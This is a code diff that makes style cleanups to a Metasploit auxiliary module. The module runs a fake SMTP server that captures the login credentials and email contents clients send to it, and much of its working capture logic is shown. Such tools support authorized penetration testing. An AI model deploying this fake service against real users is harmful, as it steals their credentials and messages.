@@ -1,25 +1,22 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-
   def initialize
     super(
-      'Name'        => 'Authentication Capture: SMTP',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: SMTP',
+      'Description' => %q(
         This module provides a fake SMTP service that
       is designed to capture authentication credentials.
-      },
+      ),
       'Author'      => ['ddz', 'hdm'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
@@ -35,8 +32,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 25 ])
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 25 ])
+      ], self.class
+    )
   end
 
   def setup
@@ -46,33 +44,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    @state[c] = { name: "#{c.peerhost}:#{c.peerport}", ip: c.peerhost, port: c.peerport, user: nil, pass: nil }
     c.put "220 SMTP Server Ready\r\n"
   end
 
   def on_client_data(c)
     data = c.get_once
-    return if not data
+    return unless data
 
     print_status("SMTP: #{@state[c][:name]} Command: #{data.strip}")
 
-    if(@state[c][:data_mode])
+    if @state[c][:data_mode]
 
       @state[c][:data_buff] ||= ''
       @state[c][:data_buff] += data
 
       idx = @state[c][:data_buff].index("\r\n.\r\n")
-      if(idx)
+      if idx
         report_note(
-          :host => @state[c][:ip],
-          :type => "smtp_message",
-          :data => @state[c][:data_buff][0,idx]
+          host: @state[c][:ip],
+          type: "smtp_message",
+          data: @state[c][:data_buff][0, idx]
         )
-        @state[c][:data_buff][0,idx].split("\n").each do |line|
+        @state[c][:data_buff][0, idx].split("\n").each do |line|
           print_status("SMTP: #{@state[c][:name]} EMAIL: #{line.strip}")
         end
 
@@ -84,8 +82,7 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-
-    cmd,arg = data.strip.split(/\s+/, 2)
+    cmd, arg = data.strip.split(/\s+/, 2)
     arg ||= ""
 
     case cmd.upcase
@@ -94,13 +91,13 @@ class MetasploitModule < Msf::Auxiliary
       return
 
     when 'MAIL'
-      x,from = data.strip.split(":", 2)
+      x, from = data.strip.split(":", 2)
       @state[c][:from] = from.strip
       c.put "250 OK\r\n"
       return
 
     when 'RCPT'
-      x,targ = data.strip.split(":", 2)
+      x, targ = data.strip.split(":", 2)
       @state[c][:rcpt] = targ.strip
       c.put "250 OK\r\n"
       return
@@ -130,8 +127,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     c.put "503 Server Error\r\n"
-    return
-
+    nil
   end
 
   def report_cred(opts)
@@ -163,6 +159,4 @@ class MetasploitModule < Msf::Auxiliary
   def on_client_close(c)
     @state.delete(c)
   end
-
-
 end
